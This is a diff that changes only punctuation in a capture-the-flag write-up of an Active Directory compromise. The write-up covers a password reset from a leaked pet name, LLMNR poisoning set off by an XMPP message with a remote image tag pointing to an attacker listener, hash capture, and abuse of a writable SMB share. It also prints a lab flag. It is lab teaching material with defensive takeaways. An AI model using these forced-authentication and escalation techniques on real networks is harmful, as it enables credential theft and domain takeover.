@@ -49,9 +49,9 @@ nmap -p- -sC -sV -T4 -Pn 10.48.190.199
 
 The combination of a full AD service stack, an internal messaging service (Openfire/XMPP), and a public web login page indicated multiple viable entry points, so enumeration proceeded methodically across each surface rather than jumping straight to exploitation.
 
-## 4. Initial Access — Web-Based Information Disclosure
+## 4. Initial Access , Web-Based Information Disclosure
 
-The IIS-hosted login portal on port 80 presented a standard authentication form. Inspecting the page's image resource revealed an embedded filename that inadvertently disclosed personal information tied to a valid account — specifically, a pet's name associated with the user `lilyle`, a common security-question/password-hint pattern.
+The IIS-hosted login portal on port 80 presented a standard authentication form. Inspecting the page's image resource revealed an embedded filename that inadvertently disclosed personal information tied to a valid account , specifically, a pet's name associated with the user `lilyle`, a common security-question/password-hint pattern.
 
 Using this disclosed value, the account's password was reset to a known value (`ChangeMe#1234`), yielding the first authenticated foothold into the domain.
 
@@ -68,7 +68,7 @@ This confirmed valid domain authentication and exposed a share containing the fi
 
 **Flag 1:** `THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}`
 
-## 6. Credential Harvesting — LLMNR Poisoning via XMPP
+## 6. Credential Harvesting , LLMNR Poisoning via XMPP
 
 With one domain account compromised, the next objective was to harvest credentials for additional users to expand access. Given the presence of SMB, LDAP, and an internal XMPP messaging service, an LLMNR/NBT-NS poisoning attack was identified as a viable path to capture NTLM authentication attempts from other domain clients.
 
@@ -82,7 +82,7 @@ Using the compromised `lilyle` account, an XMPP message was sent containing a re
 <img src="http://10.8.82.29/a.png">
 ```
 
-When another domain user, `buse`, opened the message, their client automatically attempted NTLM authentication to the attacker-controlled listener when resolving the embedded image — a classic forced-authentication technique that requires no exploit, only a client that automatically renders remote content.
+When another domain user, `buse`, opened the message, their client automatically attempted NTLM authentication to the attacker-controlled listener when resolving the embedded image , a classic forced-authentication technique that requires no exploit, only a client that automatically renders remote content.
 
 **Result:** Responder captured an NTLMv2 challenge-response hash for `WINDCORP\buse`.
 
@@ -127,9 +127,9 @@ whoami /all
 - `SeChangeNotifyPrivilege`
 - `SeIncreaseWorkingSetPrivilege`
 
-`SeMachineAccountPrivilege` stood out as the critical finding — this right permits a user to join computer accounts to the domain and is a well-known Active Directory privilege-escalation primitive when combined with other misconfigurations, though in this case the more direct escalation path came from a writable SMB share rather than machine-account abuse itself.
+`SeMachineAccountPrivilege` stood out as the critical finding , this right permits a user to join computer accounts to the domain and is a well-known Active Directory privilege-escalation primitive when combined with other misconfigurations, though in this case the more direct escalation path came from a writable SMB share rather than machine-account abuse itself.
 
-## 10. Privilege Escalation — Writable SMB Share Abuse
+## 10. Privilege Escalation , Writable SMB Share Abuse
 
 Further share enumeration revealed a writable SMB share (`brittanycr`) accessible to the `buse` account. A malicious payload file was crafted locally:
 
@@ -248,7 +248,7 @@ The initial foothold in this chain originated from the public IIS web login page
 
 ## 17. Key Takeaways
 
-- **Small information leaks compound into full domain compromise.** A single exposed password hint was the first domino in a chain that ended in domain administrator access — no individual step required an advanced exploit.
+- **Small information leaks compound into full domain compromise.** A single exposed password hint was the first domino in a chain that ended in domain administrator access , no individual step required an advanced exploit.
 - **Legacy name-resolution protocols remain a reliable attack path.** LLMNR/NBT-NS poisoning continues to work in modern AD environments simply because it is rarely disabled by default, and any mechanism that forces a client to attempt authentication (here, an internal chat client loading an image) is enough to trigger it.
 - **Writable file shares are a direct privilege-escalation vector.** Once a share can be written to by a standard user and its contents are processed with elevated context, the effective privilege boundary of that share becomes irrelevant.
 - **User rights assignments deserve the same scrutiny as group memberships.** `SeMachineAccountPrivilege` on a standard account is easy to overlook in a permissions review but represents a real Active Directory escalation primitive.
